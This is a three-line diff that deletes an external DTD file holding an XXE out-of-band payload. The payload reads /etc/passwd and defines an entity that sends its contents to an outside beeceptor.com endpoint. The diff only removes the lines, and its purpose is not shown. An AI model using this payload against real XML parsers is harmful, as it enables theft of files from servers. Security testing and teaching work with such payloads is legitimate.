@@ -1,3 +1,0 @@
-<!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % eval "<!ENTITY send SYSTEM 'https://phulelouch.free.beeceptor.com/?x=%file;'>">
-%eval;
